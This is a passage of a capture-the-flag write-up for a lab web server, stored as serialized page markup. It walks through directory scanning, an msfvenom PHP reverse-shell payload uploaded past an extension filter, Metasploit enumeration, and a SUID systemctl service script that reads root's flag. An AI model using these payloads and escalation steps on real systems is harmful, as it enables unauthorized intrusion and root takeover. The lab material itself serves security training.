Threads:        10\\n[+] Wordlist:       GitHub/SecLists/Discovery/Web-Content/big.txt\\n[+] Status codes:   200,204,301,302,307,401,403\\n[+] User Agent:     gobuster/3.0.1\\n[+] Timeout:        10s\\n===============================================================\\n2020/09/02 20:52:40 Starting gobuster\\n===============================================================\\n/.htaccess (Status: 403)\\n/.htpasswd (Status: 403)\\n/css (Status: 301)\\n/fonts (Status: 301)\\n/images (Status: 301)\\n/internal (Status: 301)\\n/js (Status: 301)\\n/server-status (Status: 403)\\n===============================================================\\n2020/09/02 20:56:58 Finished\\n===============================================================\\n\"}]]}],[\"$\",\"p\",null,{\"className\":\"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg\",\"children\":[[\"$\",\"span\",\"48\",{\"children\":\"We can see various pages. Visiting them we find that on \"}],[\"$\",\"code\",null,{\"className\":\" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg\",\"children\":\"/internal\"}],[\"$\",\"span\",\"50\",{\"children\":\" there is an\"}],\"\\r\\n\",[\"$\",\"span\",\"52\",{\"children\":\"upload form.\"}]]}],[\"$\",\"p\",null,{\"className\":\"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg\",\"children\":[[\"$\",\"span\",\"55\",{\"children\":\"If we run gobuster again on this path we can find a second directory\"}],\"\\r\\n\",[\"$\",\"code\",null,{\"className\":\" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg\",\"children\":\"/internal/uploads/\"}],[\"$\",\"span\",\"58\",{\"children\":\".\"}]]}],[\"$\",\"h2\",null,{\"className\":\"mb-4 text-primary-900 dark:text-primary-50 text-3xl font-bold tracking-tight sm:text-4xl md:text-5xl\",\"children\":[[\"$\",\"span\",\"61\",{\"children\":\"Exploitation\"}]]}],[\"$\",\"h3\",null,{\"className\":\"mb-4 text-primary-900 dark:text-primary-50 text-2xl font-bold tracking-tight sm:text-3xl md:text-4xl\",\"children\":[[\"$\",\"span\",\"64\",{\"children\":\"Compromise the webserver\"}]]}],[\"$\",\"p\",null,{\"className\":\"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg\",\"children\":[[\"$\",\"span\",\"67\",{\"children\":\"We start by generating our reverse shell. I chose to use a meterpreter reverse\"}],\"\\r\\n\",[\"$\",\"span\",\"69\",{\"children\":\"shell.\"}]]}],[\"$\",\"$Le\",\"73\",{\"language\":\"bash\",\"className\":\"mb-4 mt-2\",\"children\":[[\"$\",\"span\",\"72\",{\"children\":\"msfvenom --payload php/meterpreter/reverse_tcp  LHOST=$USER_IP LPORT=$PORT \u003e payload.php\\n\"}]]}],[\"$\",\"p\",null,{\"className\":\"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg\",\"children\":[[\"$\",\"span\",\"75\",{\"children\":\"Let\"}],[\"$\",\"span\",\"76\",{\"children\":\"â€™\"}],[\"$\",\"span\",\"77\",{\"children\":\"s also start the Metasploit console with an \"}],[\"$\",\"code\",null,{\"className\":\" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg\",\"children\":\"exploit/multi/handler\"}],[\"$\",\"span\",\"79\",{\"children\":\".\"}]]}],[\"$\",\"p\",null,{\"className\":\"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg\",\"children\":[[\"$\",\"span\",\"82\",{\"children\":\"Unfortunately if we try to upload it the extension is blocked. If we try the\"}],\"\\r\\n\",[\"$\",\"span\",\"84\",{\"children\":\"extensions provided in the image from the challenge, we find that one works. We\"}],\"\\r\\n\",[\"$\",\"span\",\"86\",{\"children\":\"can find the uploaded file in the \"}],[\"$\",\"code\",null,{\"className\":\" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg\",\"children\":\"/internal/uploads/\"}],[\"$\",\"span\",\"88\",{\"children\":\" directory that we found\"}],\"\\r\\n\",[\"$\",\"span\",\"90\",{\"children\":\"before.\"}]]}],[\"$\",\"p\",null,{\"className\":\"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg\",\"children\":[[\"$\",\"span\",\"93\",{\"children\":\"We now have a shell on the box.\"}]]}],[\"$\",\"p\",null,{\"className\":\"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg\",\"children\":[[\"$\",\"span\",\"96\",{\"children\":\"Now we background the session and use the \"}],[\"$\",\"code\",null,{\"className\":\" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg\",\"children\":\"post/linux/gather/enum_system\"}],[\"$\",\"span\",\"98\",{\"children\":\" to\"}],\"\\r\\n\",[\"$\",\"span\",\"100\",{\"children\":\"enumerate the system information, including the user accounts. With the \"}],[\"$\",\"code\",null,{\"className\":\" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg\",\"children\":\"loot\"}],\"\\r\\n\",[\"$\",\"span\",\"103\",{\"children\":\"command, we can list the gathered items, and at the end of there user list, we\"}],\"\\r\\n\",[\"$\",\"span\",\"105\",{\"children\":\"have the \"}],[\"$\",\"strong\",\"108\",{\"children\":[[\"$\",\"span\",\"107\",{\"children\":\"bill\"}]]}],[\"$\",\"span\",\"109\",{\"children\":\" user. In his home directory, we can find the user flag which\"}],\"\\r\\n\",[\"$\",\"span\",\"111\",{\"children\":\"is readable by \"}],[\"$\",\"code\",null,{\"className\":\" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg\",\"children\":\"www-data\"}],[\"$\",\"span\",\"113\",{\"children\":\" (our user).\"}]]}],[\"$\",\"h3\",null,{\"className\":\"mb-4 text-primary-900 dark:text-primary-50 text-2xl font-bold tracking-tight sm:text-3xl md:text-4xl\",\"children\":[[\"$\",\"span\",\"116\",{\"children\":\"Privilege escalation\"}]]}],[\"$\",\"p\",null,{\"className\":\"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg\",\"children\":[[\"$\",\"span\",\"119\",{\"children\":\"To gather more information about the box, we can use the \"}],[\"$\",\"code\",null,{\"className\":\" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg\",\"children\":\"upload\"}],[\"$\",\"span\",\"121\",{\"children\":\" command to\"}],\"\\r\\n\",[\"$\",\"span\",\"123\",{\"children\":\"upload the\"}],\"\\r\\n\",[\"$\",\"$Ld\",null,{\"title\":\"\",\"className\":\"font-bold text-accent-700 visited:text-accent-900 hover:underline dark:text-accent-400 dark:visited:text-accent-600\",\"href\":\"https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS\",\"children\":[[\"$\",\"span\",\"126\",{\"children\":\"linPEAS\"}]]}],\"\\r\\n\",[\"$\",\"span\",\"129\",{\"children\":\"script. This will list all the interesting information on the box, including\"}],\"\\r\\n\",[\"$\",\"span\",\"131\",{\"children\":\"the SUID binaries. Une of them sticks out, the \"}],[\"$\",\"code\",null,{\"className\":\" items-baseline rounded bg-primary-200 p-0.5 text-sm dark:bg-primary-700 sm:p-1 sm:text-base xl:text-lg\",\"children\":\"systemctl\"}],[\"$\",\"span\",\"133\",{\"children\":\" executable that bad\"}],\"\\r\\n\",[\"$\",\"span\",\"135\",{\"children\":\"since we can execute and change the state of all the services on the machine\"}],\"\\r\\n\",[\"$\",\"span\",\"137\",{\"children\":\"without root privilege. We look up\"}],\"\\r\\n\",[\"$\",\"$Ld\",null,{\"title\":\"\",\"className\":\"font-bold text-accent-700 visited:text-accent-900 hover:underline dark:text-accent-400 dark:visited:text-accent-600\",\"href\":\"https://gtfobins.github.io/gtfobins/systemctl/\",\"children\":[[\"$\",\"span\",\"140\",{\"children\":\"systemctl | GTFOBins\"}]]}],[\"$\",\"span\",\"142\",{\"children\":\" to find\"}],\"\\r\\n\",[\"$\",\"span\",\"144\",{\"children\":\"an easy way to exploit it.\"}]]}],[\"$\",\"$Le\",\"148\",{\"language\":\"bash\",\"className\":\"mb-4 mt-2\",\"children\":[[\"$\",\"span\",\"147\",{\"children\":\"#!/bin/sh\\n\\nTF=$(mktemp).service\\necho '[Service]\\nType=oneshot\\nExecStart=/bin/sh -c \\\"cat /root/root.txt \u003e /tmp/output\\\"\\n[Install]\\nWantedBy=multi-user.target' \u003e $TF\\nsystemctl link $TF\\nsystemctl enable --now $TF\\n\"}]]}],[\"$\",\"p\",null,{\"className\":\"mb-2 text-sm text-primary-900 dark:text-primary-50 sm:text-base xl:text-lg\",\"children\":[[\"$\",\"span\",\"150\",{\"children\":\"This script will create a temp service file, link, enable, and run it. The\"}],\"\\r\\n\",[\"$\",\"span\",\"152\",{\"children\":\"service will be run as root and will cat the flag into the tmp directory that\"}],\"\\r\\n\",[\"$\",\"span\",\"154\",{\"children\":\"is readable for us. We could also run a meterpreter reverse shell to gain a\"}],\"\\r\\n\",[\"$\",\"span\",\"156\",{\"children\":\"root shell on the box.\"}]]}]]}]\n"])</script>